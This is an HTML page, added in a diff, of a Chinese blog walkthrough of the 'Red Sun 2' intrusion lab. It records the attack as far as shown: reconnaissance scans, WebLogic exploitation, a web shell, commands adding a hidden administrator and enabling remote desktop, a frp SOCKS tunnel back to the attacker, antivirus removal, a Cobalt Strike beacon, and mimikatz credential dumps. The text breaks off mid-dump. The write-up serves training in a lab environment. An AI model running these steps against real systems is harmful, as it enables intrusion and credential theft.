@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="红日靶场2 难度：middle">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场2">
+<meta property="og:url" content="https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/index.html">
+<meta property="og:site_name" content="清风的博客">
+<meta property="og:description" content="红日靶场2 难度：middle">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231218203752-xb5jeh8.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231218203809-q43c5e4.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231218203642-nj5tctc.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212161141-i6kzd2n.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212161058-iaj5arh.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212161625-vx2zxtl.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212161634-4ha8g60.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212161735-s8giwgx.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212162136-xe51w6n.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212162337-rjv4txn.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212162551-r29m30y.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212162916-n5lh5w4.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231211194800-1r6iydb.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212162939-gtzivwx.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212163028-r1uvrym.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212163512-mel0yjy.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212204247-gsnefrx.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215102252-4ruzfm3.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215102318-bfmvyg1.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/83ccaf034441cd191c8e66a16db09f8-20231215102428-x52ahmi.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/3deaffc9816ab19e12a5b913604aba0-20231215102452-iy4knfm.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215102543-zv4cscd.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215102619-51erplh.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215103244-0i2y82m.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215103950-vhu9r0l.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215104029-bfgs7yz.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215103724-jjkj8ou.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215104055-chfngf3.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215104131-ssxpfwd.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215105235-a7iy7lw.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215104635-2ixrfey.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215104705-bk65you.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231215104620-r665fjo.png">
+<meta property="article:published_time" content="2023-12-18T12:44:07.000Z">
+<meta property="article:modified_time" content="2023-12-18T12:47:06.872Z">
+<meta property="article:author" content="清风">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qingfeng.tech/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231218203752-xb5jeh8.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>红日靶场2</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><!-- hexo-inject:begin --><!-- hexo-inject:end --><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/12/12/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/&text=红日靶场2"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/&title=红日靶场2"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/&is_video=false&description=红日靶场2"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=红日靶场2&body=Check out this article: https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/&title=红日靶场2"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/&title=红日靶场2"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/&title=红日靶场2"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/&title=红日靶场2"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/&name=红日靶场2&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qingfeng.tech/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/&t=红日靶场2"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2"><span class="toc-number">1.</span> <span class="toc-text">红日靶场2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">靶场配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">基础配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.2.</span> <span class="toc-text">网卡配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E9%87%8D%E8%A6%81%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.3.</span> <span class="toc-text">最重要的配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E6%89%91"><span class="toc-number">1.1.4.</span> <span class="toc-text">拓扑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">1.3.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hash%E4%BC%A0%E9%80%92-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91"><span class="toc-number">1.4.</span> <span class="toc-text">hash传递-内网横向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.1.</span> <span class="toc-text">横向信息探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%AA%E5%90%91getshell"><span class="toc-number">1.4.2.</span> <span class="toc-text">横向getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash%E4%BC%A0%E9%80%92%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-number">1.4.3.</span> <span class="toc-text">Hash传递文件传输</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91"><span class="toc-number">1.5.</span> <span class="toc-text">令牌-内网横向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.6.</span> <span class="toc-text">权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.6.1.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">1.6.2.</span> <span class="toc-text">白银票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%9C%E5%83%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">1.6.3.</span> <span class="toc-text">镜像劫持</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        红日靶场2
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">清风</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-12-18T12:44:07.000Z" class="dt-published" itemprop="datePublished">2023-12-18</time>
+        
+        (Updated: <time datetime="2023-12-18T12:47:06.872Z" class="dt-updated" itemprop="dateModified">2023-12-18</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E9%9D%B6%E6%9C%BA/">靶机</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="红日靶场2"><a href="#红日靶场2" class="headerlink" title="红日靶场2"></a>红日靶场2</h1><h2 id="靶场配置"><a href="#靶场配置" class="headerlink" title="靶场配置"></a>靶场配置</h2><h3 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h3><ul>
+<li>红日靶场一下载地址 :<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></li>
+<li>靶机通用密码：administrator&#x2F;1qaz@WSX</li>
+</ul>
+<h3 id="网卡配置"><a href="#网卡配置" class="headerlink" title="网卡配置"></a>网卡配置</h3><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231218203752-xb5jeh8.png" alt="image">​</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231218203809-q43c5e4.png" alt="image">​</p>
+<p>网卡配置就是这样</p>
+<p>PC和WEb都配两张（NAT和VMnet2），防火墙也懒得搞了，因为PC这台根本不让访问，防火墙得手动去关掉才行，但是也打不下来。</p>
+<h3 id="最重要的配置"><a href="#最重要的配置" class="headerlink" title="最重要的配置"></a>最重要的配置</h3><p><strong>WEB配置</strong></p>
+<p>目录<code>C:\Oracle\Middleware\user_projects\domains\base_domain</code>​，以管理员身份运行运行<code>statweblogic</code>​服务</p>
+<h3 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h3><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231218203642-nj5tctc.png" alt="image">​</p>
+<p>‍</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这里直接用fscan进行信息收集了</p>
+<pre class=" language-xml"><code class="language-xml">┌──(root㉿kali)-[/home/kali/Desktop/Tools]
+└─# ./fscan_amd64 -h 192.168.111.80 -np
+
+   ___                              _  
+  / _ \     ___  ___ _ __ __ _  ___| | __ 
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;  
+\____/     |___/\___|_|  \__,_|\___|_|\_\   
+                     fscan version: 1.8.2
+start infoscan
+192.168.111.80:7001 open
+192.168.111.80:1433 open
+192.168.111.80:135 open
+192.168.111.80:445 open
+192.168.111.80:139 open
+192.168.111.80:80 open
+[*] alive ports len is: 6
+start vulscan
+[*] WebTitle: http://192.168.111.80     code:200 len:0      title:None
+[+] 192.168.111.80      MS17-010        (Windows Server 2008 R2 Standard 7601 Service Pack 1)
+[*] WebTitle: http://192.168.111.80:7001 code:404 len:1164   title:Error 404--Not Found
+[+] InfoScan:http://192.168.111.80:7001 [weblogic] 
+已完成 6/6
+[*] 扫描结束,耗时: 11.134261019s
+</code></pre>
+<p>发现又是ms17010？</p>
+<p>打打看</p>
+<p><code>auxiliary/admin/smb/ms17_010_command</code>​模块：</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212161141-i6kzd2n.png" alt="image">​</p>
+<p><code>exploit/windows/smb/ms17_010_eternalblue</code>​模块：</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212161058-iaj5arh.png" alt="image">​</p>
+<p>发现没打通，那这里就用<code>weblogic</code>​的洞去打打看</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>工具直接打通了：</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212161625-vx2zxtl.png" alt="image">​</p>
+<p>连接哥斯拉：</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212161634-4ha8g60.png" alt="image">​</p>
+<p>现在就尝试上线CS，准备横向</p>
+<p>上线CS之前我们看看有没有杀软：<code>tasklist /svc</code>​</p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/av/1.php">Windows杀软在线查询 (ddosi.org)</a> </p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212161735-s8giwgx.png" alt="image">​</p>
+<p>发现有一个360，所以我们这里得要尝试关闭360</p>
+<p>第一思路是看他启动权限，发现他乱码了</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212162136-xe51w6n.png" alt="image">​</p>
+<p>那就直接kill，但是失败了，所以这里我就打算上桌面去关闭了</p>
+<p>我们新建帐号：</p>
+<pre class=" language-xml"><code class="language-xml">net user qingfeng qwer1234! /add
+net localgroup administrators qingfeng /add
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+</code></pre>
+<p>发现添加成功</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212162337-rjv4txn.png" alt="image">​</p>
+<p>但是这里由于又防火墙的原因，所以我们只能挂代理进去接管</p>
+<p>上传frpc到Web系统</p>
+<p>本地起一个frps</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212162551-r29m30y.png" alt="image">​</p>
+<p>然后Web系统执行frpc.exe -c frpc.ini连接</p>
+<p>配置文件如下：</p>
+<p>frps.ini</p>
+<pre class=" language-xml"><code class="language-xml">[common]
+## 一、服务器的基本配置部分
+## 7000 是FRP服务端口，可以改
+bind_port = 7000
+## dashboard_user和dashboard_pwd是FRP网页版管理员用户名密码，可以改。
+dashboard_user = admin
+dashboard_pwd = frpadmin@2022
+## 7500 是网页版管理端口：可以通过 http://服务器ip:7500登陆
+dashboard_port = 25500
+## 服务器和客户机之间的心跳连接
+heartbeat_timeout = 30
+#token设置，需要和客户端一致，客户端与服务端通过token进行认证，建议满足复杂度要求
+token=frpToken@admin2022
+</code></pre>
+<p>frpc.ini</p>
+<pre class=" language-xml"><code class="language-xml">[common]
+server_addr = 192.168.111.1
+server_port = 7000
+token = frpToken@admin2022
+
+
+[proxy]
+type = tcp
+plugin = socks5
+remote_port = 25599
+</code></pre>
+<p>proxifier挂上mstsc代理</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212162916-n5lh5w4.png" alt="image">​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231211194800-1r6iydb.png" alt="image">​</p>
+<p>远程连接：</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212162939-gtzivwx.png" alt="image">​</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212163028-r1uvrym.png" alt="image">​</p>
+<p>关闭之后就可以愉快的上线了，当然你这里有360免杀的话可以选择跳过这一步</p>
+<p>上传木马上线：</p>
+<p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212163512-mel0yjy.png" alt="image">​</p>
+<h2 id="hash传递-内网横向"><a href="#hash传递-内网横向" class="headerlink" title="hash传递-内网横向"></a>hash传递-内网横向</h2><p>上线之后就是考虑如何横向了</p>
+<p>主要思路就是两个：</p>
+<p>1.打服务</p>
+<p>2.抓密码</p>
+<h3 id="横向信息探测"><a href="#横向信息探测" class="headerlink" title="横向信息探测"></a>横向信息探测</h3><p>先上fscan探测一下其他存活主机：</p>
+<pre class=" language-xml"><code class="language-xml">[12/15 10:08:46] [*] Tasked beacon to run: fscan.exe -h 10.10.10.10/24 -o out.txt
+[12/15 10:08:46] [+] host called home, sent: 68 bytes
+[12/15 10:08:56] [+] received output:
+
+   ___                              _  
+  / _ \     ___  ___ _ __ __ _  ___| | __ 
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;  
+\____/     |___/\___|_|  \__,_|\___|_|\_\   
+                     fscan version: 1.7.1
+start infoscan
+(icmp) Target 10.10.10.10     is alive
+(icmp) Target 10.10.10.129    is alive
+(icmp) Target 10.10.10.128    is alive
+[*] Icmp alive hosts len is: 3
+10.10.10.10:445 open
+10.10.10.128:139 open
+10.10.10.10:88 open
+10.10.10.129:7001 open
+10.10.10.129:1433 open
+10.10.10.128:445 open
+10.10.10.129:445 open
+10.10.10.129:139 open
+10.10.10.128:135 open
+10.10.10.129:135 open
+10.10.10.10:135 open
+10.10.10.129:80 open
+10.10.10.10:139 open
+[*] alive ports len is: 13
+[*] start vulscan
+[+] NetInfo:
+[*]10.10.10.129
+   [->]WEB
+   [->]192.168.120.132
+   [->]10.10.10.129
+[+] 10.10.10.129	MS17-010	(Windows Server 2008 R2 Standard 7601 Service Pack 1)
+[*] 10.10.10.129         DE1AY\WEB               Windows Server 2008 R2 Standard 7601 Service Pack 1
+[+] NetInfo:
+[*]10.10.10.10
+   [->]DC
+   [->]10.10.10.10
+[+] 10.10.10.10	MS17-010	(Windows Server 2012 R2 Standard 9600)
+[+] 10.10.10.128	MS17-010	(Windows 7 Ultimate 7601 Service Pack 1)
+[*] 10.10.10.10    [+]DC DE1AY\DC                Windows Server 2012 R2 Standard 9600
+[*] 10.10.10.128         __MSBROWSE__\PC                Windows 7 Ultimate 7601 Service Pack 1
+[*] WebTitle:http://10.10.10.129       code:200 len:0      title:None
+
+[12/15 10:08:59] [+] received output:
+[*] WebTitle:http://10.10.10.129:7001  code:404 len:1164   title:Error 404--Not Found
+[+] InfoScan:http://10.10.10.129:7001  [weblogic] 
+
+[12/15 10:09:00] [+] received output:
+[+] http://10.10.10.129:7001 poc-yaml-weblogic-cve-2019-2729-2 
+[+] http://10.10.10.129:7001 poc-yaml-weblogic-cve-2017-10271 echo
+[+] http://10.10.10.129:7001 poc-yaml-weblogic-cve-2020-14750 
+[+] http://10.10.10.129:7001 poc-yaml-weblogic-cve-2019-2729-1 
+[+] http://10.10.10.129:7001 poc-yaml-weblogic-cve-2019-2725 v10
+</code></pre>
+<p>没有可利用的服务，所以现在先尝试抓密码利用smbexe之类的进行横向</p>
+<p>抓密码可以看到很多结果：</p>
+<pre class=" language-xml"><code class="language-xml">[12/15 09:00:48] qf beacon> logonpasswords
+[12/15 09:00:48] [*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+[12/15 09:00:49] [+] host called home, sent: 313675 bytes
+[12/15 09:00:49] [+] received output:
+
+Authentication Id : 0 ; 2701098 (00000000:0029372a)
+Session           : RemoteInteractive from 2
+User Name         : qingfeng
+Domain            : WEB
+Logon Server      : WEB
+Logon Time        : 2023/12/12 16:29:39
+SID               : S-1-5-21-3767205380-3469466069-2137393323-1007
+    msv :
+     [00000003] Primary
+     * Username : qingfeng
+     * Domain   : WEB
+     * LM       : 1319b0fa23c89f2d7e51f0bf38bde884
+     * NTLM     : 6912928308e3cda903e6d75bd6091a20
+     * SHA1     : 4687d6f9b23b55f21825bc5157fe2cbe707c07de
+    tspkg :
+     * Username : qingfeng
+     * Domain   : WEB
+     * Password : qwer1234!
+    wdigest :
+     * Username : qingfeng
+     * Domain   : WEB
+     * Password : qwer1234!
+    kerberos :
+     * Username : qingfeng
+     * Domain   : WEB
+     * Password : qwer1234!
+    ssp :
+    credman :
+
+Authentication Id : 0 ; 138374 (00000000:00021c86)
+Session           : Service from 0
+User Name         : mssql
+Domain            : DE1AY
+Logon Server      : DC
+Logon Time        : 2023/12/12 15:57:57
+SID               : S-1-5-21-2756371121-2868759905-3853650604-2103
+    msv :
+     [00000003] Primary
+     * Username : mssql
+     * Domain   : DE1AY
+     * LM       : f67ce55ac831223dc187b8085fe1d9df
+     * NTLM     : 161cff084477fe596a5db81874498a24
+     * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d
+    tspkg :
+     * Username : mssql
+     * Domain   : DE1AY
+     * Password : 1qaz@WSX
+    wdigest :
+     * Username : mssql
+     * Domain   : DE1AY
+     * Password : 1qaz@WSX
+    kerberos :
+     * Username : mssql
+     * Domain   : DE1AY.COM
+     * Password : 1qaz@WSX
+    ssp :
+    credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WEB$
+Domain            : DE1AY
+Logon Server      : (null)
+Logon Time        : 2023/12/12 15:57:56
+SID               : S-1-5-20
+    msv :
